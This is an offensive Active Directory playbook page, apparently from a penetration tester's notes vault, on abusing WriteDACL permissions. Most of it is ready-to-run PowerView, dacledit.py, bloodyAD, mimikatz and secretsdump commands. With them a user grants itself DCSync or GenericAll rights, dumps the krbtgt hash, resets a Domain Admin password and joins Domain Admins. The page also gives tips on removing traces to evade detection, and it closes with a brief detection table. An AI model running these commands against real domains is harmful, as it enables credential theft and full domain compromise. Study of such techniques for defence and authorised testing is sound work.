---
title: "Attack #21 — WriteDACL Abuse"
description: "WriteDACL allows an attacker to modify the Discretionary Access Control List of a target AD object — meaning they can grant themselves (or any principal)…"
category: active-directory
subcategory: "ACL Abuse"
tags: ["active-directory", "credential-access", "privilege-escalation", "hashing"]
tools: ["Impacket", "Mimikatz", "BloodHound", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Three/🟡 Attack #21 — WriteDACL Abuse.md"
---
# 🟡 Attack #21 — WriteDACL Abuse

***

## 📖 How It Works

WriteDACL allows an attacker to **modify the Discretionary Access Control List** of a target AD object — meaning they can grant themselves (or any principal) **any permission they want** on that object. This is typically used as a **stepping stone**: the attacker grants themselves GenericAll or DCSync rights, then uses those elevated permissions to exploit the target.

The most devastating use is WriteDACL on the **domain root object** (`DC=corp,DC=local`), which allows the attacker to grant themselves DCSync rights — enabling extraction of every credential in the domain without Domain Admin privileges.

### Exploitation Chain

```
1. Identify WriteDACL on a target object (BloodHound / PowerView)
2. Add a new ACE granting yourself desired rights:
   - GenericAll on user/group → password reset / group membership
   - DCSync rights on domain root → extract all hashes
3. Exploit the newly granted permissions
4. Optionally remove the ACE to cover tracks
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **WriteDACL ACE on target** | Your controlled principal must have WriteDACL in the target's DACL |
| **Domain user account** | Any authenticated domain user |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **PowerView** | Windows | `Add-DomainObjectAcl` — add ACEs to DACLs |
| **Impacket — dacledit.py** | Linux | Remote DACL editing |
| **bloodyAD** | Linux | `add dcsync`, `add genericAll` shortcuts |
| **ldap_shell** | Linux | Interactive LDAP exploitation |

***

## 💻 Full Commands

### 🔴 WriteDACL on Domain Root → Grant DCSync

```powershell
# ── PowerView — grant DCSync rights to yourself ──────────────────────────────
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity low_user -Rights DCSync -Verbose

# ── Now DCSync ────────────────────────────────────────────────────────────────
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

```bash
# ── dacledit.py ───────────────────────────────────────────────────────────────
dacledit.py -action write -rights DCSync \
  -principal low_user -target-dn "DC=corp,DC=local" \
  corp.local/low_user:'Password1' -dc-ip 10.10.10.10

# Now DCSync
secretsdump.py corp.local/low_user:'Password1'@DC01.corp.local -just-dc-user krbtgt

# ── bloodyAD ──────────────────────────────────────────────────────────────────
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  add dcsync low_user
```

### 🔴 WriteDACL on User → Grant GenericAll

```powershell
# ── Grant GenericAll over a DA account ────────────────────────────────────────
Add-DomainObjectAcl -TargetIdentity targetadmin -PrincipalIdentity low_user -Rights All

# ── Now reset their password ──────────────────────────────────────────────────
$NewPassword = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetadmin -AccountPassword $NewPassword
```

```bash
# ── dacledit.py — grant GenericAll ────────────────────────────────────────────
dacledit.py -action write -rights FullControl \
  -principal low_user -target targetadmin \
  corp.local/low_user:'Password1' -dc-ip 10.10.10.10
```

### 🔴 WriteDACL on Group → Grant Self-Add

```powershell
# ── Grant yourself rights to modify group membership ──────────────────────────
Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
  -PrincipalIdentity low_user -Rights All

# ── Add yourself to Domain Admins ─────────────────────────────────────────────
Add-DomainGroupMember -Identity "Domain Admins" -Members low_user
```

### 🔴 Cleanup — Remove the ACE

```powershell
# ── Remove the ACE you added ──────────────────────────────────────────────────
Remove-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity low_user -Rights DCSync -Verbose
```

```bash
# ── dacledit.py cleanup ───────────────────────────────────────────────────────
dacledit.py -action remove -rights DCSync \
  -principal low_user -target-dn "DC=corp,DC=local" \
  corp.local/low_user:'Password1' -dc-ip 10.10.10.10
```

***

## 🎯 OPSEC Tips

- **Always remove the ACE after exploitation** — leaving DCSync rights on a low-priv user is a permanent IOC
- **WriteDACL → DCSync is the most common escalation path** found in ACL-based attacks
- **Event 4662 and 5136 catch DACL modifications** — but many environments don't audit these events

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | Object access — tracks DACL writes on the domain root |
| **5136** | Security Log (DC) | Directory Service object modification — nTSecurityDescriptor changes |
| **4670** | Security Log (DC) | Permissions on an object were changed |

***

## 🔗 Attack Chain Context

```
[WriteDACL] ──→ Grant Yourself Any Permission
         │
         ├──→ 🩸 Domain root → DCSync rights → all domain hashes
         ├──→ 👤 User object → GenericAll → password reset → account takeover
         ├──→ 👥 Group object → modify membership → add self to DA
         ├──→ 🔗 Chain: WriteDACL → DCSync (#37) → Golden Ticket (#11)
         └──→ 💀 Defeated by: audit DACLs, monitor 4670/5136, least privilege
```

***

> ✅ **Attack #21 — WriteDACL Abuse complete.**
